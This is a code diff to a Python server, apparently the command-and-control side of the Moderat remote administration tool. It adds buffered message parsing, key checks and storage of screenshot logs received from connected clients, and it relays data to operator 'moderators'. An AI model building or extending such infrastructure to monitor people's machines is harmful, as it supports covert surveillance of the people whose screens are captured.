@@ -18,6 +18,7 @@ import datetime
 LOGFILE = 'server.log'
 CLIENTS_PORT = 4434
 MODERATORS_PORT = 1313
+DATA_STORAGE = r'C:\DATA'
 
 # Initialize logger
 log = logging.getLogger('')
@@ -49,6 +50,10 @@ moderators = {}
 
 class ModeratServerProtocol(Protocol):
 
+    def __init__(self):
+
+        self.__buffer__ = ''
+
     # New Connection Made
     def connectionMade(self):
         self.send_message_to_client(self, 'connectSuccess', 'welcome')
@@ -78,17 +83,27 @@ class ModeratServerProtocol(Protocol):
         except KeyError:
             pass
 
-    def dataReceived(self, data):
+    def dataReceived(self, data, end='[ENDOFMESSAGE]'):
         # Data Received
-        command = self.recieve_message(data)
-        # Switch to client commands
-        if command['from'] == 'client':
-            self.client_commands(command['payload'], command['mode'], command['session_id'])
-        # Switch to moderator commands
-        elif command['from'] == 'moderator':
-            self.moderator_commands(command)
+        self.__buffer__ += data
+        if self.__buffer__.endswith(end):
 
-    def client_commands(self, payload, mode, session_id):
+            all_data = self.__buffer__[:-len(end)]
+            if end in all_data:
+                all_data = all_data.split(end)[-1]
+            self.__buffer__ = ''
+            command = ast.literal_eval(all_data)
+
+            # Switch to client commands
+            if command['from'] == 'client':
+                self.client_commands(command['payload'], command['mode'], command['session_id'], command['key'])
+            # Switch to moderator commands
+            elif command['from'] == 'moderator':
+                self.moderator_commands(command)
+
+
+
+    def client_commands(self, payload, mode, session_id, key):
 
         # Clients Initializing
         if mode == 'clientInitializing':
@@ -118,7 +133,7 @@ class ModeratServerProtocol(Protocol):
             manageClients.set_client_online(client_id)
 
         # Clients Status Checker
-        elif mode == 'infoChecker':
+        elif mode == 'infoChecker' and clients.has_key(payload['key']):
             client_socket = clients[payload['key']]['socket']
             clients[payload['key']] = {
                 'ip_address':           self.transport.getHost().host,
@@ -136,13 +151,16 @@ class ModeratServerProtocol(Protocol):
 
         # Data Logger
         elif mode == 'screenshotLogs':
-            print payload
             screen_info = ast.literal_eval(payload)
-            save_image(screen_info)
+            save_image(screen_info, key, DATA_STORAGE)
+            log.info('Screenshot Saved (%s)' % key)
 
-        else:
+        elif moderators.has_key(session_id):
             log.info('Send Data to Moderator (%s)' % moderators[session_id]['username'])
             self.send_message_to_moderator(moderators[session_id]['socket'], payload, mode)
+
+        else:
+            return
 
     def moderator_commands(self, data):
 
@@ -256,16 +274,6 @@ class ModeratServerProtocol(Protocol):
             return True
         else:
             return False
-
-    def recieve_message(self, data, end='[ENDOFMESSAGE]'):
-        try:
-            output = data[:-len(end)].decode('utf-8')
-            if end in output:
-                output = output.split(end)[0]
-            return ast.literal_eval(output)
-        except Exception as e:
-            print e, '\n', data
-            sys.exit(1)
 
     def send_message_to_client(self, client, message, mode, _from='server', session_id='', end='[ENDOFMESSAGE]'):
         # Send Data Function
